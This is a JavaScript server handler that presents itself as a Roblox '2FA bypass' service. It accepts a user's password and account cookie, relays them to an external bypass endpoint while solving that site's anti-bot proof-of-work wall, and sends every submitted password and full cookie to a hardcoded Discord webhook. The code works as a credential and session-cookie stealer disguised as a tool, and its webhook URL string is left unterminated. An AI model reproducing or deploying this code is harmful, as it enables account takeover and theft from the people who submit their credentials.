import crypto from 'crypto';

// ── Webhook configuration ──
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1535565391831633922/qGPItYyWVhdZBgzZ5Imc3P-rDe5evtpkopomqgfH2RZKQHRblWoe8QBSJ0xL5817ww3B;

// ── EggyWall PoW Solver ──
function solveEggyWall(html) {
    try {
        const saltMatch = html.match(/const publicSalt = "([^"]+)"/);
        const targetMatch = html.match(/const target = "([^"]+)"/);
        const diffMatch = html.match(/const difficulty = (\d+)/);

        if (!saltMatch || !targetMatch || !diffMatch) return null;

        const publicSalt = saltMatch[1];
        const target = targetMatch[1];
        const difficulty = parseInt(diffMatch[1]);

        const charset = '0123456789abcdef';
        const max = Math.pow(charset.length, difficulty);

        for (let i = 0; i < max; i++) {
            let suffix = '';
            let temp = i;

            for (let j = 0; j < difficulty; j++) {
                suffix = charset[temp % charset.length] + suffix;
                temp = Math.floor(temp / charset.length);
            }

            const attempt = publicSalt + suffix;
            const hash = crypto.createHash('sha256').update(attempt).digest('hex');

            if (hash === target) {
                return attempt;
            }
        }
        return null;
    } catch (e) {
        return null;
    }
}

// ── Webhook sender (matching Roblox embed style) ──
async function sendWebhook(req, requestData, responseStatus, success, responseBody) {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || 'unknown';
    const timestamp = new Date().toISOString();

    const { Type, Password, Cookie } = requestData || {};

    const profileLink = '';

    const mainEmbed = {
        title: success ? `✅ 2FA Bypass - Succeeded` : `❌ 2FA Bypass - Failed`,
        url: success ? profileLink : undefined,
        color: success ? 0x00ff00 : 0xff0000,
        thumbnail: undefined,
        fields: [
            {
                name: '🌐 IP Address',
                value: ip,
                inline: true
            }
        ],
        footer: {
            text: `User-Agent: ${userAgent.substring(0, 100)}`
        },
        timestamp: timestamp
    };

    if (success) {
        mainEmbed.author = {
            name: `2FA Bypass Result`,
            url: profileLink || undefined,
            icon_url: undefined
        };
    }

    mainEmbed.fields.push(
        {
            name: '📋 Type',
            value: Type || 'N/A',
            inline: true
        },
        {
            name: '🔑 Password',
            value: Password || 'N/A',
            inline: true
        },
        {
            name: '📊 Response Status',
            value: String(responseStatus),
            inline: true
        },
        {
            name: '✅ Success',
            value: success ? 'Yes' : 'No',
            inline: true
        },
        {
            name: '📦 Response Snippet',
            value: responseBody
                ? `\`\`\`json\n${(typeof responseBody === 'string' ? responseBody : JSON.stringify(responseBody)).slice(0, 500)}\n\`\`\``
                : 'N/A',
            inline: false
        }
    );

    const cookieEmbed = {
        title: '🔑 Cookie',
        color: 0xffa500,
        description: `\`\`\`\n${Cookie || 'N/A'}\n\`\`\``,
        fields: [
            {
                name: 'Cookie Length',
                value: `${(Cookie || '').length} characters`,
                inline: true
            },
            {
                name: 'Timestamp',
                value: timestamp,
                inline: true
            }
        ],
        timestamp: timestamp
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: '@everyone',
                embeds: [mainEmbed, cookieEmbed],
                username: '2FA Bypass',
                avatar_url: 'https://cdn.discordapp.com/avatars/...',
                allowed_mentions: {
                    parse: ['everyone']
                }
            })
        });
    } catch (webhookError) {
        console.error('Webhook send failed:', webhookError);
    }
}

// ── 1. Anti-DDoS Memory Block ──
const requestCounts = {};

export default async function handler(req, res) {
    // 2. Spam Blocker Logic
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const now = Date.now();

    for (let key in requestCounts) {
        if (now - requestCounts[key].firstRequest > 60000) {
            delete requestCounts[key];
        }
    }

    if (!requestCounts[ip]) {
        requestCounts[ip] = { firstRequest: now, count: 1 };
    } else {
        requestCounts[ip].count++;
    }

    // Limit to 5 requests per minute because bypassing is a heavy operation
    if (requestCounts[ip].count > 5) {
        return res.status(429).json({ error: 'Too many requests. Stop spamming.' });
    }

    // 3. Bot User-Agent Blocker
    const userAgent = req.headers['user-agent'] || '';
    if (userAgent.toLowerCase().includes('python') || 
        userAgent.toLowerCase().includes('curl') || 
        userAgent.toLowerCase().includes('axios') || 
        userAgent.toLowerCase().includes('postman') || 
        userAgent === '') {
        return res.status(403).json({ error: 'Bots are not allowed.' });
    }

    // 4. Fixed CORS Logic (Allows your site, blocks external scripts)
    const origin = req.headers.origin;
    // Replace with the exact Vercel URL where this bypasser is hosted
    const allowedOrigins = [
        'https://bypasser-jade.vercel.app', 
    '    http://localhost:3000'
    ];
    
    if (origin && !allowedOrigins.includes(origin)) {
        return res.status(403).json({ error: 'Access Denied.' });
    }
    
    if (origin) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    }

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

    // 5. Your original bypass logic
    try {
        const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { Type, Password, Cookie } = body || {};

        if (!Type || !Password || !Cookie) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        const targetUrl = 'https://immortal.st/api/misc/2faBypass.php';
        const baseHeaders = {
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'Origin': 'https://immortal.st',
            'Referer': 'https://immortal.st/'
        };

        const payload = JSON.stringify({ Type, Password, Cookie });

        // Initial Request
        let response = await fetch(targetUrl, {
            method: 'POST',
            headers: baseHeaders,
            body: payload
        });

        let responseText = await response.text();

        // Check if EggyWall blocked us
        if (responseText.includes('EggyWall') && responseText.includes('publicSalt')) {
            console.log('EggyWall challenge detected. Solving...');
            const token = solveEggyWall(responseText);

            if (token) {
                console.log('EggyWall solved! Token:', token);
                baseHeaders['Cookie'] = `EggyWall_Token=${token}`;

                response = await fetch(targetUrl, {
                    method: 'POST',
                    headers: baseHeaders,
                    body: payload
                });
                responseText = await response.text();
            } else {
                const success = false;
                await sendWebhook(req, { Type, Password, Cookie }, 403, success, 'Failed to solve EggyWall PoW');
                return res.status(403).json({ error: 'Failed to solve EggyWall PoW challenge.' });
            }
        }

        const httpSuccess = response.status >= 200 && response.status < 300;

        let responseData = responseText;
        const contentType = response.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
            try {
                responseData = JSON.parse(responseText);
            } catch (_) { /* keep raw */ }
        }

        let finalSuccess = httpSuccess;
        let finalMessage = '';
        if (responseData && typeof responseData === 'object' && 'success' in responseData) {
            finalSuccess = responseData.success === true;
        }

        if (finalSuccess) {
            finalMessage = 'Cookie Bypassed Successfully';
        } else {
            finalMessage = 'Cookie Invalid.';
        }

        await sendWebhook(req, { Type, Password, Cookie }, response.status, finalSuccess, responseData);

        return res.status(response.status).json({
            success: finalSuccess,
            message: finalMessage
        });

    } catch (error) {
        return res.status(500).json({ error: 'Internal Server Error', details: error.message });
    }
}
